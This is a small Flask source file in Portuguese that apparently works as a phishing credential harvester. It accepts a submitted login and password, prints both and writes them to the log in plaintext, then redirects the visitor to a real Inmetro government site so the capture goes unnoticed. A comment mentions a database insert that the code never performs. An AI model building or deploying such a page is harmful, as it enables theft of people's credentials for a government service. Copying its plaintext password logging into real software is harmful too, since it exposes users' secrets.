from flask import Flask, render_template, request, redirect

app = Flask(__name__)

class Dados:
   def __init__(self, login, senha):
      self.login = login
      self.senha = senha

@app.route('/')
def index():
  return render_template('index.html')


@app.route('/', methods=['POST'])
def login():
    if request.method == 'POST':
      login = request.form['login']
      senha = request.form['senha']

      # Criar um objeto com os dados recebidos
      dados = Dados(login, senha)

      # gerar log no terminal com dados de login e senha
      print(dados.login)
      print(dados.senha)

      app.logger.info('Login: ' + dados.login)
      app.logger.info('Senha: ' + dados.senha)
      
      # Redirecionar para um site após a inserção no banco de dados
      return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')

if __name__ == '__main__':
  app.run(port=5000)
